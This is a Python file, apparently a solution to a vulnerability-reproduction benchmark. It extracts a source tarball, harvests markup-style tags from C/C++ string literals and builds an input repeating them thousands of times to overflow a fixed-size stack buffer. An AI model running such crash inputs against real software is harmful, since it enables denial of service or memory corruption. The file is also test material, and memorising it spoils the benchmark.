import os
import re
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_")
        try:
            # Extract tarball
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)

            # Collect candidate tag-like strings from source files
            exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh")
            candidate_tags = set()

            for root, _, files in os.walk(tmpdir):
                for fname in files:
                    if not fname.endswith(exts):
                        continue
                    path = os.path.join(root, fname)
                    try:
                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
                            text = f.read()
                        # Find string literals (simple heuristic, single-line only)
                        for m in re.finditer(r'"([^"\n]{1,200})"', text):
                            s = m.group(1)
                            # Look for <tag>-style patterns
                            for tm in re.finditer(r'<[A-Za-z/][^>]{0,40}>', s):
                                candidate_tags.add(tm.group(0))
                            # Look for [tag]-style patterns
                            for tm in re.finditer(r'\[[A-Za-z/][^\]]{0,40}\]', s):
                                candidate_tags.add(tm.group(0))
                    except Exception:
                        continue

            # Fallback to common markup tags if none found
            if not candidate_tags:
                candidate_tags = {
                    "<br>", "<BR>",
                    "<b>", "</b>",
                    "<i>", "</i>",
                    "<p>", "</p>",
                    "<font>", "</font>",
                    "<tag>", "</tag>",
                    "<span>", "</span>",
                    "<a>", "</a>",
                    "<ul>", "</ul>",
                    "<li>", "</li>",
                    "[b]", "[/b]",
                    "[i]", "[/i]",
                    "[url]", "[/url]",
                }

            # Keep only ASCII-encodable tags
            ascii_tags = []
            for t in candidate_tags:
                try:
                    t.encode("ascii")
                    ascii_tags.append(t)
                except UnicodeEncodeError:
                    continue

            if not ascii_tags:
                ascii_tags = ["<br>"]

            ascii_tags.sort()

            # Build PoC: repeat each tag many times to overflow fixed-size stack buffer
            REPEATS = 2000
            parts = []
            for t in ascii_tags:
                parts.append(t * REPEATS)
            poc_str = "".join(parts)

            # Ensure a minimum overall length
            if len(poc_str) < 2048:
                base = ascii_tags[0]
                extra_reps = (2048 - len(poc_str)) // len(base) + 1
                poc_str += base * extra_reps

            poc_bytes = poc_str.encode("ascii", errors="ignore")

            # Add a trailing newline in case parser expects line-terminated input
            if not poc_bytes.endswith(b"\n"):
                poc_bytes += b"\n"

            return poc_bytes
        finally:
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass
